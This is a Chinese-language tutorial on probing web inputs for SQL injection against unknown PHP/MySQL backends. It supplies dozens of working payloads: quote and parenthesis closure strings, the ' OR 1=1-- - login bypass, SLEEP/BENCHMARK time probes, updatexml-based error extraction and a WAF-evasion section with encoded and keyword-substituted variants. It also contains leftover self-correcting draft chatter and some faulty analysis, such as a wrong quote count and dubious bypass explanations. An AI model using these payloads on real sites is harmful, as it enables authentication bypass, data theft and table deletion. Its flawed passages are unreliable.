# SQL 注入探测方法论：面对未知后端 SQL 的系统化入门

## 概述

本文档解决一个具体问题：**知道 SQL 注入的原理，但面对一个真实的输入点时，不知道该输入什么 payload 来判断是否存在注入。**

核心思路：**不要猜后端代码，而是用系统化的探测序列，让目标的行为告诉你它用的是什么 SQL 结构。**

所有 payload 聚焦于"探测与确认"阶段，不涉及数据提取。

## 1. 核心问题

```
用户输入  →  [不可见的 PHP 代码]  →  SQL 语句  →  [不可见的数据库]  →  响应
              ^^^^^^^^^^^^^^^^
              这部分我们看不到
```

大多数人的困难在于：**不知道 PHP 代码把输入放进了什么样的 SQL 语句里**，所以不知道该用什么闭合方式、引号还是括号、是否需要注释符。

解决思路：**把未知变成已知，通过系统化的输入序列，根据目标的行为反推后端 SQL 的结构。**

这不是猜谜，而是可控的实验。每次输入一个 payload，观察响应（报错信息、内容差异、响应时间），逐步缩小可能性。

## 2. 系统探测决策树

### 2.1 第一步：判断数字型还是字符型

这一步的目的：**确定输入点在 SQL 中是否被引号包裹。**

| 阶段 | 输入 | 预期（数字型） | 预期（字符型） |
|------|------|--------------|--------------|
| A | `1` | 正常响应 | 正常响应 |
| B | `1/1` (=1) | 正常响应（同 A） | 正常响应（字符串字面量 `1/1`） |
| C | `1/0` (=error/无结果) | **与 A/B 不同**（除零错误或无结果） | 与 A/B **相同**（仍为字符串 `1/0`） |

判定规则：
- 如果 B 和 A 表现一致，而 C 与 A 不同 → **数字型**（SQL 对 `1/0` 做了数学运算）
- 如果 A、B、C 三者表现均相同 → **字符型**（输入被当作字符串字面量，未执行运算）

注意事项：
- `1/0` 在某些语言中会触发除零错误（`division by zero`），这是强信号
- 如果目标没有可见的错误信息，观察响应长度差异
- `1/1` 和 `1/0` 对字符型来说只是字符串，无任何运算意义，所以不会产生差异

### 2.2 第二步：确定闭合方式

如果第一步判定为**数字型**，跳到 2.3。

如果第一步判定为**字符型**，需要确定引号类型和括号层次。

#### 2.2.1 探测引号类型

**核心原理**：输入一个未配对的引号会破坏 SQL 语法，产生报错或行为异常。

```
输入: '
后端 SQL: WHERE col = '''    ← 三个引号，语法错误
```

```
输入: "
后端 SQL: WHERE col = """    ← 三个双引号，语法错误（MySQL 默认模式下双引号也是字符串定界符）
```

**探测序列**：

| 序列 | 输入 | 目的 |
|------|------|------|
| 1 | `'` | 探测单引号：是否报错？ |
| 2 | `"` | 探测双引号：是否报错？ |
| 3 | `\` | 转义探测：如果 `\` 后跟的引号被转义，可辅助确认引号类型 |

关于序列 3 的补充说明：
- 如果 `'` 报错但 `\'` 不报错：说明 `\` 成功转义了后面的 `'`，后端没有对 `\` 做额外转义（即未使用 `addslashes()` 或类似函数）
- 如果 `\'` 仍然报错：后端可能对 `\` 也做了转义（`\\'`），此时 SQL 中看到的是字面量反斜杠加未转义引号
- 这个技巧对宽字节注入的前期探测也有帮助（见 2.5 宽字节场景）

#### 2.2.2 探测括号层次

如果引号探测确认是字符串型，接下来判断是否有括号包裹。

**核心原理**：大多数带括号的 SQL 模式会在输入点周围加上括号，比如 `WHERE col = ('$input')`。我们需要确定到底有几层括号。

**探测序列**（假设已确认是单引号字符串）：

| 输入 | 后端 SQL 变成 | 分析 |
|------|-------------|------|
| `'` | `WHERE col = (''')` | 报错：括号内三个引号语法错误 |
| `')-- -` | `WHERE col = ('')-- -')` | 如果成功（恢复正常），说明有一层括号和单引号 |
| `'))-- -` | `WHERE col = ((''))-- -')` | 如果是两层括号，这样闭合 |
| `')))-- -` | 更多层 | 继续递增直到不再报错 |

注释符说明：
- `-- -` 等价于 `-- `（双短横 + 空格 + 任意内容），空格之后都是注释
- `--+` 用于 GET 请求（URL 中 `+` 解码为空格）
- `--%20` 显式编码空格
- `#` 是 MySQL 的行注释符，在 POST 请求中更常用
- `-- -` 中的 `-` 只是注释内容，不是语法的一部分；`-- a` 也一样有效

**没有注释符时的闭合技巧**（当空格或 `-` 被过滤）：

不需要注释符也能闭合，通过构造自平衡的字符串：

```
输入: ' OR '1'='1
SQL:  WHERE col = '' OR '1'='1'
                         ^  ^
                         |  原模板的尾部引号
                         注入的引号与它配对
```

引号配对分析：
```
WHERE col = '' OR '1'='1'
             ^^  ^^^  ^^
             12  345  67

配对：(1,2) 空串  (3,4) '1'  (5,6) '1'  — 还有一个引号 7？
```

等一下，让我重新数一遍。模板 `WHERE col = '$input'` 尾部有一个 `'`。

输入 `' OR '1'='1`，注入后：
```
WHERE col = '' OR '1'='1'
```

字符逐一标注（`I` = 注入的字符，`T` = 模板字符）：
```
W H E R E   c o l   =   '   '     O R     '   1   '   =   '   1   '   '
                        T   I   I I I I I   I   I   I   I   I   I   I   T
```

引号序列：`'`(T) `'`(I) ... `'`(I) `'`(I) ... `'`(I) `'`(I) ... `'`(T)

一共 8 个引号 — 偶数，可以配成 4 对。没有语法错误。

VERIFIED: `' OR '1'='1` 不需要注释即可闭合单引号字符串。

对于带括号的情况同理 — 自平衡版本不需要注释：
```
模板: WHERE col = ('$input')
输入: ') OR ('1'='1
SQL:  WHERE col = ('') OR ('1'='1')
                   ^^        ^^
                   T I  I I I I T  ← 括号和引号都平衡
```

括号配对：`('')` 和 `('1'='1')` — 两个括号组都正确闭合。
引号配对：`''` `'1'` `'1'` `''`(来自第二个括号内的 `'1'='1'` 被括号包裹，尾部模板的 `')` 提供了最后的闭括号和引号)

再次核对 `') OR ('1'='1` 的注入：
```
模板: WHERE col = ('$input')
                         ^  ^
                         闭括号  闭引号

输入: ') OR ('1'='1
SQL:  WHERE col = ('') OR ('1'='1')
                   ^^         ^^
                   (1)        (2)

分组 1: ('')  — 空字符串在括号内
分组 2: ('1'='1') — 字符串等式在括号内，恒真

WHERE col = (分组1) OR (分组2)
→ WHERE col = '' OR '1'='1'  ← 恒真
```

VERIFIED: `') OR ('1'='1` 正确闭合了一层括号 + 单引号。

推广到多层括号 — **自平衡法不需要注释符**：

| 括号层数 | 模板 | 闭合输入 |
|---------|------|---------|
| 1 层 | `('$input')` | `') OR ('1'='1` |
| 2 层 | `(('$input'))` | `')) OR (('1'='1` |
| 3 层 | `((('$input')))` | `'))) OR ((('1'='1` |

规则：**注入 `)` × N + ` OR (` × N + `'1'='1`，其中 N = 需要闭合的括号层数，最外层引号由模板尾部提供。**

#### 2.2.3 混合闭合的常见组合

| 组合 | 输入示例 | 闭合了 |
|------|---------|--------|
| 纯单引号 | `' OR 1=1-- -` | `'` |
| 纯双引号 | `" OR 1=1-- -` | `"` |
| 单引号 + 1 层括号 | `') OR 1=1-- -` | `')` |
| 单引号 + 2 层括号 | `')) OR 1=1-- -` | `'))` |
| 双引号 + 1 层括号 | `") OR 1=1-- -` | `")` |
| 括号 + 单引号 | `') OR ('1'='1` | `')` (自平衡版本) |

### 2.3 第三步：选择确认手段

确定闭合方式后，选择一个确认手段来验证注入是否真实存在。

#### 手段 A：布尔逻辑确认（有可见差异）

**前提**：目标对"有数据"和"无数据"的响应有可观察的差异（响应长度、页面内容、HTTP 状态码等）。

```
闭合确认后的 SQL 模板:  WHERE col = '[我们的注入点]'

真条件 payload:  ' OR '1'='1      →  WHERE col = '' OR '1'='1'  → 恒真 → 返回所有数据
假条件 payload:  ' AND '1'='2     →  WHERE col = '' AND '1'='2' → 恒假 → 返回零条数据
```

判定：真条件与假条件的响应有显著差异 → 注入确认。

注意事项：
- `OR '1'='1` 可能返回**所有行**，如果表很大，响应可能异常巨大。可以改用 `OR 1=1`（数字比较更快）
- `AND '1'='2` 返回零行，但**前提是原查询本身能返回至少一行**。如果原查询条件本身就不匹配任何行，AND 假条件不会改变结果（仍然是零行），此时真假无差异，产生**假阴性**
- 安全的做法：**OR 真** 和 **AND 假**都测试，对比三态（原输入、OR 真、AND 假）

#### 手段 B：时间延迟确认（无可见差异）

**前提**：目标没有错误回显，布尔真/假响应相同。这是"盲注"中最基础的确认方式。

```
闭合后 SQL: WHERE col = '' [我们的注入逻辑]

payload:  ' OR SLEEP(5)-- -
SQL:      WHERE col = '' OR SLEEP(5)-- -'
```

判定：响应延迟约 5 秒或以上 → 注入确认。

关于环境：
- `SLEEP(n)` 是 MySQL 函数；PostgreSQL 用 `pg_sleep(n)`；MSSQL 用 `WAITFOR DELAY '0:0:5'`；Oracle 用 `DBMS_LOCK.SLEEP(5)`
- 延迟函数的执行时机受短路求值影响：

**短路求值问题**：
```
payload:  ' AND SLEEP(5)-- -
SQL:      WHERE col = '' AND SLEEP(5)
```

如果 `col = ''` 为假（大多数情况下如此），MySQL 会**短路**，不执行 `SLEEP(5)`，导致零延迟 → **假阴性**。

**纠正**：用 `OR` 而非 `AND`：
```
payload:  ' OR SLEEP(1)-- -
SQL:      WHERE col = '' OR SLEEP(1)
```

`col = ''` 为假 → 必须计算 `SLEEP(1)` 来决定整个 OR 的结果 → 延迟发生。

但 `OR SLEEP(n)` 有一个**行乘数问题**：如果原查询返回 N 行，SLEEP 被调用 N 次，总延迟 = N × n 秒。若 N = 1000，`SLEEP(1)` 会导致约 1000 秒延迟。

**缓解方案**：
- 首次探测用 `OR SLEEP(0.5)`，降低行乘数影响
- 或使用 `OR (SELECT SLEEP(1) FROM DUAL LIMIT 1)` — 子查询只返回一行，但外层的 WHERE 仍会对每行评估一次这个子查询…实际效果取决于 MySQL 优化器行为，不可靠
- 更可靠的做法：`' OR IF(1=1, SLEEP(1), 0)-- -` — 但仍有行乘数问题

**最安全的探测策略**：
1. 先用 `' OR SLEEP(0.5)-- -` → 如果延迟约 0.5s，确认注入（单行或多行，但延迟存在）
2. 如果延迟异常大 → 说明表很大，但也确认了注入
3. 如果无延迟 → 尝试 `' AND SLEEP(0.5)-- -` → 覆盖短路求值导致的假阴性
4. 如果依然无延迟 → 可能注入不在此位置，或使用了其他数据库的延迟函数

#### 手段 C：报错确认（有错误回显）

**前提**：目标会显示数据库错误信息。这是最快捷的确认方式。

```
payload 1: '  → 观察是否出现语法错误
payload 2: ' OR 1=1-- -  → 如果报错消失，确认注入
```

如果有错误回显且闭合正确，报错注入可以一步到位确认注入 + 获取数据。常用函数：

| 函数 | 数据库 | 示例 |
|------|--------|------|
| `updatexml()` | MySQL | `' AND updatexml(1,concat(0x7e,database()),1)-- -` |
| `extractvalue()` | MySQL | `' AND extractvalue(1,concat(0x7e,database()))-- -` |
| `convert()` | PostgreSQL | 类型转换报错 |
| `convert()` / `db_name()` | MSSQL | 类型转换报错 |

但这是数据提取阶段的内容了。在**探测阶段**，只要有错误回显，简单的 `'` 和 `' OR 1=1-- -` 对比就足够了。

#### 手段选择决策

```
有错误回显？
  └─ 是 → 手段 C（报错确认，最快）
  └─ 否 → 有页面内容差异？
            └─ 是 → 手段 A（布尔确认）
            └─ 否 → 手段 B（时间确认）
```

## 3. 后端 SQL 模式目录

以下按照"从最常见到冷门"排列 PHP 后端中可能出现的 SQL 查询模式。

每个模式包含：
- **PHP 代码示例**（后端可能长什么样）
- **注入点分析**（我们控制的是哪部分）
- **闭合 payload**（如何闭合）
- **探测 payload**（最小可用的测试输入）
- **注意事项**

### 3.1 基础 SELECT — 单引号字符串

#### 模式 A: `WHERE col = '$input'`

这是最最最常见的模式，大约 70% 的字符型注入都是这种。

```php
// PHP 代码（你看不到，但它长这样）
$sql = "SELECT * FROM users WHERE id = '$id'";
// 或
$sql = 'SELECT * FROM users WHERE name = \'' . $name . '\'';
```

**注入点**：`'$input'` — 单引号字符串内部。

**闭合方法**：
```
输入: '
SQL:  SELECT * FROM users WHERE id = '''   ← 语法错误

输入: ' OR '1'='1
SQL:  SELECT * FROM users WHERE id = '' OR '1'='1'   ← 语法正确，恒真

输入: ' OR 1=1-- -
SQL:  SELECT * FROM users WHERE id = '' OR 1=1-- -'   ← 注释掉了尾部引号
```

**推荐探测序列**：
```
1. '           → 看是否报错
2. ' OR '1'='1 → 看是否返回所有数据（页面内容显著增多或不同）
3. ' AND '1'='2 → 看是否返回空（页面内容显著减少或不同）
```

如果 2 和 3 有明显差异 → 注入确认。

**自平衡版**（不需要注释符）：
```
' OR '1'='1     ← 注入的引号与模板尾部引号配对
' AND '1'='2    ← 同上
```

---

#### 模式 B: `WHERE col = "$input"`

PHP 双引号字符串内插变量，SQL 使用双引号作为字符串定界符。

```php
$sql = "SELECT * FROM users WHERE name = \"$name\"";
// SQL: SELECT * FROM users WHERE name = "user_input"
```

注意：MySQL 在默认模式（非 ANSI_QUOTES）下，双引号等价于单引号作为字符串定界符。所以这种模式与模式 A 本质相同，只是引号字符不同。

**闭合方法**：
```
输入: " OR "1"="1
SQL:  SELECT * FROM users WHERE name = "" OR "1"="1"

输入: " OR 1=1-- -
SQL:  SELECT * FROM users WHERE name = "" OR 1=1-- -"
```

**推荐探测序列**：
```
1. "           → 看是否报错
2. " OR "1"="1 → 恒真
3. " AND "1"="2 → 恒假
```

**双引号 vs 单引号区分技巧**：
- 输入 `'` 报错 → 单引号
- 输入 `"` 报错 → 双引号
- 两者都报错 → 可能是单引号且双引号在 SQL 中有其他用途（如别名），先按单引号处理
- 两者都不报错 → 可能不是字符串注入，回到数字型判断

---

### 3.2 基础 SELECT — 括号包裹

#### 模式 C: `WHERE col = ('$input')`

单层括号 + 单引号，在各种 CMS 和框架的 ORM 生成的 SQL 中很常见。

```php
$sql = "SELECT * FROM users WHERE status = ('$status')";
```

**闭合分析**：
```
模板:    WHERE status = ('$input')
                         ^  ^
                         左括号  右括号+引号

输入:    ') OR 1=1-- -
SQL:     WHERE status = ('') OR 1=1-- -')
                          ^^
                          我们闭合了单引号和右括号
                          原模板的 '') 被注释
```

**推荐探测序列**：
```
1. '           → 报错？(括号内未闭合引号)
2. ')-- -      → 恢复正常？(只闭合，不加注入逻辑，观察是否消除报错)
3. ') OR 1=1-- - → 恒真
4. ') AND 1=2-- - → 恒假
```

关键技巧：**步骤 2 是纯闭合测试** — 如果加了 `')-- -` 之后原来的错误消失了，说明你猜对了闭合方式。这是一种不依赖注入逻辑的"机械式"确认方法，比直接上 `OR 1=1` 更精细。

**自平衡版本**（无注释符）：
```
输入: ') OR ('1'='1
SQL:  WHERE status = ('') OR ('1'='1')
```

---

#### 模式 C2: `WHERE col = (('$input'))` 或多层括号

多见于复杂查询、子查询嵌套、或框架自动生成的 SQL。

```php
// 2 层括号
$sql = "SELECT * FROM items WHERE (category = ('$cat'))";
```

**通用多层闭合公式**：

对 N 层括号 + 单引号：
```
闭合输入: ' + N个) + OR + N个( + '1'='1
```

例子 — 2 层括号：
```
输入: ')) OR (('1'='1
SQL:  WHERE (category = ('')) OR (('1'='1'))
```

例子 — 3 层括号：
```
输入: '))) OR ((('1'='1
```

**探测策略**：
```
从少到多逐层测试:
')-- -      → 如果仍有报错，继续
'))-- -     → 如果仍有报错，继续
')))-- -    → 直到报错消失

通常 1-3 层就够，超过 3 层比较罕见。
如果测到 5 层还没成功，考虑是否判断方向错误（可能不是括号问题）。
```

### 3.3 LIKE 模糊查询

#### 模式 D: `WHERE col LIKE '%$input%'`

搜索功能中最常见的 SQL 模式。

```php
$sql = "SELECT * FROM products WHERE name LIKE '%$keyword%'";
```

**闭合分析**：
```
模板:    WHERE name LIKE '%$input%'
                          ^       ^
                          %是LIKE的通配符

注入后的模板需要处理前后的 % 和 引号:

输入:    ' OR '1'='1'-- -
SQL:     WHERE name LIKE '%' OR '1'='1'-- -%'
                          ^^                 ^^
                          注入闭合了引号     注释掉了尾部的 %'
```

VERIFIED: `-- -` 注释从第一个空格开始，所以 `-- -%'` 中的 `%'` 都在注释范围内。

**推荐探测 payload**：
```
1. '           → 报错？
2. ' OR '1'='1'-- -  → 恒真（返回所有产品）
3. ' AND '1'='2'-- -  → 恒假（返回零产品）
```

**自平衡版本**：
```
输入: ' OR '1'='1
SQL:  WHERE name LIKE '%' OR '1'='1%'
                              ^
                              注意：这里尾部 % 被包含进了最后一个字符串

实际上是: LIKE '%' OR '1'='1%'
即: (name LIKE '%') OR ('1'='1%')
'1'='1%' → 字符串 '1' 与 '1%' 比较 → 不相等 → 为 FALSE！
```

**这是重要的陷阱！**`' OR '1'='1` 在 LIKE 场景的自平衡版本中失效，因为尾部 `%` 被带入了字符串比较。

纠正 — LIKE 场景需要避开尾部 `%`：
```
输入: ' OR 1=1-- -
SQL:  WHERE name LIKE '%' OR 1=1-- -%'
     → 注释掉了 %'

输入: ' OR 1=1#
SQL:  WHERE name LIKE '%' OR 1=1#%'
     → # 注释掉了 %'（MySQL）
```

**结论**：LIKE 场景**必须使用注释符**来消除尾部 `%'`，自平衡版本不可靠。

对于 `LIKE '$input%'`（前缀搜索）也是同理，尾部的 `%'` 需要注释掉。

---

#### 模式 E: `WHERE col LIKE '$input'`（无通配符）

较少见，但偶尔出现。等同于模式 A，按模式 A 处理即可。

---

### 3.4 复合条件

#### 模式 F: 多列 AND 条件

```php
$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
```

**注入点分析**：两个注入点，可以在第一个参数处闭合并注释掉后面的条件。

```
注入 username 参数:
输入: ' OR 1=1-- -
SQL:  SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = 'xxx'
                                                      ^^^^^^^^^^^^^^^^^^^^^^^^
                                                      被注释掉了
```

效果：绕过了密码验证。这是最经典的 SQL 注入登录绕过。

**探测 payload**（在 username 字段）：
```
' OR 1=1-- -
' OR '1'='1'-- -
' OR 1=1#
```

**注意**：如果注入点在第二个参数（password），情况不同：
```
注入 password 参数:
模板: ... AND password = '$pass'

输入: ' OR '1'='1
SQL:  ... AND password = '' OR '1'='1'
                          ^^^^^^^^^^^^^
                          无法绕过 username 的条件
```

第一个 `AND username='xxx'` 仍然需要满足。除非你知道或能猜到一个有效的用户名，否则单纯在 password 位置注入可能不够。

**探测建议**：如果有多个输入点，优先测试第一个（最靠近 SQL 语句开头的位置）。

---

#### 模式 G: `WHERE col IN ($input)`

```php
$sql = "SELECT * FROM products WHERE category_id IN ($ids)";
// $ids 通常是 "1,2,3" 这样的数字列表
```

**闭合分析**：
```
模板:  WHERE category_id IN ($input)
                            ^     ^
                            左括号  右括号

输入:  1) OR 1=1-- -
SQL:   WHERE category_id IN (1) OR 1=1-- -)
            闭合了 IN 的括号 ↑        ↑ 注释了尾括号
```

**推荐探测序列**：
```
1. 1) OR 1=1-- -    → 恒真
2. 1) AND 1=2-- -   → 恒假
3. 1) OR SLEEP(1)-- - → 时间确认
```

---

### 3.5 写入型 SQL（INSERT / UPDATE / DELETE）

#### 模式 H: INSERT

```php
$sql = "INSERT INTO users (name, email, pass) VALUES ('$name', '$email', '$pass')";
```

**特点**：
- INSERT 不返回数据行，大多数情况下没有"多数据/少数据"的差异
- 主要依赖**错误回显**或**时间延迟**来确认注入
- 如果注入成功但不可见，可能存在"二次注入"的机会（见下文）

**闭合分析**（以 name 参数为例）：
```
模板:  INSERT INTO users (name, email, pass) VALUES ('$name', '$email', '$pass')

输入:  ' OR SLEEP(1))-- -
SQL:   INSERT INTO users (name, email, pass) VALUES ('' OR SLEEP(1))-- -', 'email', 'pass')
                                                     ^^            ^^
                                   闭合了引号+OR SLEEP  闭合了 VALUES 的括号  注释了剩余列
```

**INSERT 探测策略**：

第一轮 — 错误探测：
```
'               → 语法错误？
')-- -          → 错误消失？说明闭合了 VALUES ('
```

第二轮 — 时间探测：
```
' OR SLEEP(2))-- -
' OR (SELECT SLEEP(2) FROM DUAL))-- -
```

第三轮 — 二次注入思路（如果 INSERT 本身无回显）：
```
如果你能写入数据，写入一个带有注入 payload 的字符串到某个字段，
然后在另一个页面（如用户列表、搜索功能）触发该数据的读取。
例如：name 字段写入 test' OR SLEEP(5)-- -，
然后访问用户搜索功能搜索 "test"，观察是否有延迟。
```

---

#### 模式 I: UPDATE

```php
$sql = "UPDATE users SET email = '$email' WHERE id = $uid";
```

**注入点**：通常在 SET 子句中。

```
模板:  UPDATE users SET email = '$email' WHERE id = $uid

输入:  ' OR SLEEP(1) WHERE id=1-- -
SQL:   UPDATE users SET email = '' OR SLEEP(1) WHERE id=1-- -' WHERE id = $uid
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                   OR SLEEP(1) 被执行
                                   WHERE id=1 限制只影响 ID=1 的用户
                                   注释掉原 WHERE 避免冲突
```

**探测 payload**：
```
' OR SLEEP(2)-- -         → 最简单的版本，但两个 WHERE 可能冲突
' OR SLEEP(2) WHERE 1=1-- - → 更好的版本，WHERE 1=1 避免冲突
```

两个 WHERE 子句（注入的 + 原模板的）会导致 SQL 语法错误。需要注释掉原 WHERE：
```
输入:  ' OR SLEEP(2)-- -
SQL:   UPDATE users SET email = '' OR SLEEP(2)-- -' WHERE id = $uid
                                                   ^^^^^^^^^^^^^^^^
                                                   被注释，没问题
```

VERIFIED: `-- -` 能够注释掉尾部的 `' WHERE id = $uid`。

---

#### 模式 J: DELETE

```php
$sql = "DELETE FROM users WHERE id = $uid";
```

通常是数字型注入。探测：
```
1 OR 1=1-- -     → 危险！删除所有行！
1 AND SLEEP(2)-- - → 安全，先确认注入存在
```

DELETE 的 AND/OR 逻辑与 SELECT 相同：
- `AND SLEEP(2)` → 原条件匹配时触发延迟
- `OR SLEEP(2)` → 总是触发延迟（但行乘数问题）

**安全警告**：DELETE 的 `OR 1=1` 会删除整表数据。在探测阶段务必使用时间延迟或布尔方式，避免使用 `OR 1=1`。

---

### 3.6 排序与分页

#### 模式 K: ORDER BY $input

```php
$sql = "SELECT * FROM products ORDER BY $column $direction";
// $column 来自用户输入（如 ?sort=price）
```

**特点**：通常没有引号包裹，直接是列名或列位置。`ORDER BY` 后面可以跟列名、列位置（数字）、或表达式。

**探测策略**：

第一轮 — 确认注入：
```
输入: SLEEP(1)
SQL:  SELECT * FROM products ORDER BY SLEEP(1)
      → 如果有延迟，说明输入被直接拼进 ORDER BY
```

第二轮 — 布尔确认（利用 CASE WHEN）：
```
输入: (CASE WHEN (1=1) THEN id ELSE name END)
SQL:  ORDER BY (CASE WHEN (1=1) THEN id ELSE name END)
      → 1=1 恒真，按 id 排序

输入: (CASE WHEN (1=2) THEN id ELSE name END)
      → 1=2 恒假，按 name 排序

如果两次请求的排序结果不同 → 注入确认
```

第三轮 — 利用报错：
```
输入: (SELECT 1 FROM (SELECT SLEEP(1))a)
      → 可配合报错函数
```

---

#### 模式 L: LIMIT $input

```php
$sql = "SELECT * FROM items LIMIT $start, $perpage";
```

**特点**：LIMIT 后的位置可以跟 PROCEDURE ANALYSE()（MySQL 特有）来做报错注入。

```
输入: 1 PROCEDURE ANALYSE()
SQL:  SELECT * FROM items LIMIT 1 PROCEDURE ANALYSE()
      → 如果报错或输出列信息，确认注入
```

其他探测：
```
输入: 1 INTO @a    → MySQL 变量写入，无可见影响但可配合后续操作
输入: 1 UNION SELECT ...  → 在某些 MySQL 版本中 LIMIT 后可以 UNION
```

---

### 3.7 冷门模式

#### 模式 M: BETWEEN ... AND ...

```php
$sql = "SELECT * FROM products WHERE price BETWEEN $min AND $max";
// 或字符串: WHERE name BETWEEN '$a' AND '$b'
```

**字符串版本闭合**：
```
模板: WHERE name BETWEEN '$a' AND '$b'

在 $a 位置注入:
输入: ' OR 1=1-- -
SQL:  WHERE name BETWEEN '' OR 1=1-- -' AND '$b'
```

注意 `BETWEEN a AND b` 中 AND 是 BETWEEN 语法的一部分，不是逻辑运算符。注入的 `OR 1=1` 会改变整个 WHERE 结构。

探测方法同模式 A，关键在于：**两个输入点都有可能是注入点**。

---

#### 模式 N: REGEXP / RLIKE

```php
$sql = "SELECT * FROM users WHERE name REGEXP '$pattern'";
```

与模式 A 相同处理。REGEXP 只是另一种比较运算符。

```
输入: ' OR 1=1-- -
输入: ' OR '.*'='.*   ← 正则 .* 匹配任意内容，恒真
```

---

#### 模式 O: JSON 函数

```php
$sql = "SELECT * FROM items WHERE JSON_EXTRACT(data, '$.key') = '$value'";
```

闭合方式与模式 A 相同，但需要注意嵌套引号。JSON_EXTRACT 内部使用了单引号，外部的字符串定界符可能使用双引号：

```php
// 如果 PHP 是:
$sql = 'SELECT * FROM items WHERE JSON_EXTRACT(data, \'$.key\') = "' . $value . '"';
// SQL: ... WHERE JSON_EXTRACT(data, '$.key') = "value"
// 此时注入需要闭合双引号
```

如果无法确定，回到 2.2 的探测流程。

---

#### 模式 P: 动态表名 / 列名

```php
$sql = "SELECT * FROM $table WHERE id = 1";
// 或
$sql = "SELECT $column FROM users";
```

这些位置通常不需要闭合引号，且无法使用 `UNION` 探测（因为不是 WHERE 子句）。主要通过**时间延迟**确认：
```
输入: (SELECT SLEEP(2))
SQL:  SELECT (SELECT SLEEP(2)) FROM users
```

或通过**错误信息**：如果表名/列名不存在，MySQL 会报 "Table doesn't exist" 等错误，这本身就可能暴露信息。

---

### 3.8 二次注入（Second-Order SQL Injection）

特殊的注入模式：注入 payload 不是直接在当前请求中执行，而是先被存储到数据库，然后在另一个请求中不带防护地取出执行。

```php
// 注册/写入时：安全转义
$name = mysqli_real_escape_string($conn, $_POST['name']);
$sql = "INSERT INTO users (name) VALUES ('$name')";
// 存入数据库的原始内容是:  admin' OR 1=1-- -
//（转义只在 SQL 执行时生效，存入的是原始数据）

// 其他功能读取时：没有转义
$row = mysqli_query($conn, "SELECT name FROM users WHERE id = $id");
$name = $row['name'];
$sql = "SELECT * FROM logs WHERE username = '$name'";
// $name 是 admin' OR 1=1-- -，此处注入发生！
```

**探测方法**：
1. 在写入点提交 `test' OR SLEEP(5)-- -`
2. 触发对该数据的读取（访问引用该数据的任何页面）
3. 观察是否有延迟

二次注入的**确认难度**在于：你不知道哪个功能点会读取你写入的数据。需要了解业务逻辑流程。

## 4. WAF 绕过（探测阶段）

在探测阶段就遇到 WAF 拦截时，需要绕过才能继续探测。

### 4.1 空格被过滤

在探测阶段，空格被过滤意味着 `' OR 1=1-- -` 会失效。

替换方案（聚焦于探测阶段的简单绕过）：

| 原写法 | 绕过写法 | 说明 |
|--------|---------|------|
| `' OR 1=1-- -` | `'/**/OR/**/1=1--/**/-` | `/**/` 替换空格 |
| | `'%a0OR%a01=1--%a0-` | URL 编码的不换行空格 (C1 控制字符) |
| | `'%0bOR%0b1=1--%0b-` | 垂直制表符 |
| | `'+(1=1)--+-` | `+` 在 SQL 中作为运算符，`1=1` 被括号包裹后 `+` 起空格作用 |
| | ``'`OR`1=1`--`-`` | 反引号绕过（MySQL），但注意反引号在 MySQL 中用于标识符 |

**最具通用性的探测 payload**（空格过滤）：
```
'/**/OR/**/1=1--/**/-
'/**/AND/**/1=2--/**/-
'/**/OR/**/SLEEP(1)--/**/-
```

### 4.2 关键字被过滤（OR / AND / SLEEP 等）

**绕过策略优先级**：大小写 > 双写 > 等价函数 > 编码

**OR 绕过**：
```
OR  →  oR, Or, or   （大小写混合）
OR  →  OORR          （双写，如果 WAF 只替换一次则 OR 残留）
OR  →  ||            （MySQL 逻辑或运算符，等价于 OR）
但: ' || 1=1-- - 不一定等价于 ' OR 1=1-- -，因为 || 在 MySQL 默认模式是 OR，
    但在 ANSI 模式下是字符串连接！使用前需确认。
```

**AND 绕过**：
```
AND →  aNd, AnD     （大小写）
AND →  AANDND        （双写）
AND →  &&            （MySQL 逻辑与）
AND →  AND/**/       （内联注释分割关键字）
```

**SLEEP 绕过**：
```
SLEEP(1)  →  sleep(1), SLEEP/**/(1)
SLEEP(1)  →  BENCHMARK(10000000, MD5('a'))   （MySQL 等价延迟）
SLEEP(1)  →  (SELECT 1 FROM mysql.db WHERE SLEEP(1))
```

**针对探测阶段的最小关键字方案**：
如果 OR/AND 都被过滤，可以用数学运算代替布尔逻辑：
```
' - 1 = -1-- -      → WHERE col = '' - 1 = -1-- -'  （恒真，利用了减法优先级）
' * 0 = 0-- -       → 恒真
' / 1 = 1-- -       → 恒真（col/1 = 1 取决于 col 的值，不太可靠）
```

更可靠的无关键字探测：
```
' ^ ''-- -          → XOR 空字符串等于自身，结果取决于 col 的值
                      （在 MySQL 中不太实用，因为 XOR 对字符串的行为不确定）
```

**实际上，在探测阶段最优的做法是使用 `||` 和 `&&`**：
```
' || 1=1-- -        → 等价于 OR，恒真探测
' && 1=2-- -        → 等价于 AND，恒假探测
```

### 4.3 注释符被过滤

如果 `-- -` 被过滤或 `#` 被过滤：

方案 A — 自平衡闭合（不需要注释符）：
```
' OR '1'='1        → 不需要注释符
') OR ('1'='1      → 带括号也不需要注释符
```

方案 B — 使用 `;%00`（PHP 空字节截断，PHP < 5.3.4）：
```
' OR 1=1;%00       → 空字节截断后续 SQL
```

方案 C — 闭合引号后使用分号结束语句（如果数据库允许堆叠查询）：
```
'; SELECT SLEEP(1);'   → 堆叠查询
但堆叠查询在 PHP+MySQL 中默认不支持（mysqli_query 只执行第一条语句）。
```

**推荐**：优先使用自平衡版本。它不依赖注释符，不依赖堆叠查询，只在引号/括号层面达到语法正确。

### 4.4 等号被过滤

```
1=1  →  1<>2        （不等于，恒假 → 对探测来说用处有限）
1=1  →  1 LIKE 1    （LIKE 替换等号）
1=1  →  !(1<>1)     （双重否定）
1=1  →  1 IN (1)    （IN 替换等号）
1=1  →  1 BETWEEN 1 AND 1  （BETWEEN 替换等号）
```

**探测阶段的最简绕过**：
```
' OR 1 LIKE 1-- -    → 恒真
' OR !(1<>1)-- -      → 恒真（双重否定）
```

### 4.5 综合 WAF 绕过示例

假设 WAF 同时过滤了空格、OR、AND、等号、注释符：

```
原始:  ' OR 1=1-- -

可能的绕过:
'||1/**/LIKE/**/1'       ← || 代替 OR, /**/ 代替空格, LIKE 代替 =,
                           尾部注入的引号与模板尾部引号自平衡
```

但实际上，如果 WAF 到了这个程度，探测阶段就不应该纠结于绕过它。这已经进入了更高级的攻防对抗范畴。在探测阶段，遇到强 WAF 时：
1. 优先寻找 WAF 未覆盖的注入点（如 HTTP Header、Cookie）
2. 考虑参数污染（HPP），利用不同中间件对相同参数名的处理差异

